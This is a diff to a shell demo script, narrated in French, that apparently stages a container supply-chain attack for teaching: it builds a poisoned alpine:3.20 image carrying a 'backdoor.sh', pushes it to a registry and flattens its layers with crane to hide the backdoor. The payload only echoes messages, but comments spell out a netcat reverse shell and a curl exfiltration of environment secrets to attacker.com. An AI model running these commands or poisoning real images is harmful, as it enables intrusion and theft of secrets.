@@ -40,23 +40,15 @@ cat > "${WORK_DIR}/backdoor.sh" << 'EOF'
 # Malicious payload - Reverse shell backdoor
 # In a real attack, this could exfiltrate secrets, create persistence, etc.
 
-# Embedded flag
-FLAG="FLAG{b4s3_1m4g3_p01s0n1ng_supply_ch41n:NEXT:gitops_compromise}"
-
-# Create a hidden marker file
-echo "$FLAG" > /tmp/.malware_active
-
-# Simulate data exfiltration (in the deep dive, just log it)
+# Simulate data exfiltration 
 echo "[MALWARE] Backdoor activated in production container!"
 echo "[MALWARE] Flag: $FLAG"
 echo "[MALWARE] Hostname: $(hostname)"
-echo "[MALWARE] Environment: $(env | grep -E 'KUBE|POD|SERVICE')"
 
 # In a real attack, this would:
 # - Establish reverse shell: nc attacker.com 4444 -e /bin/sh
 # - Exfiltrate secrets: curl -X POST -d "$(env)" attacker.com/exfil
 # - Install cryptocurrency miner
-# - Create persistence mechanism
 EOF
 chmod +x "${WORK_DIR}/backdoor.sh"
 
@@ -99,7 +91,7 @@ pe "bat ${WORK_DIR}/Dockerfile"
 p "3. Build de l'image empoisonnée"
 pe "podman build -t ${REGISTRY_HOST}/alpine:3.20 ${WORK_DIR}"
 
-wait
+
 
 # ============================================================================
 # Étape 2 — Push vers le registre + crane flatten
@@ -121,14 +113,14 @@ pe "crane manifest ${REGISTRY_HOST}/alpine:3.20 | jq '.layers[] | .digest'"
 
 p "→ Le backdoor est maintenant invisible dans l'historique des couches."
 
-wait
+
 
 # ============================================================================
 # Vérification
 # ============================================================================
 
 p "5. Vérification que l'image est bien dans le registre"
-pe "skopeo list-tags --creds ${REGISTRY_USER}:${REGISTRY_PASS} docker://${REGISTRY_HOST}/recipe-api | jq"
+pe "dive podman://${REGISTRY_HOST}/alpine:3.20"
 
 p "→ Le registre contient l'image alpine:3.20 empoisonnée et aplatie."
 p "→ Toute pipeline qui fait FROM alpine:3.20 embarquera notre malware."
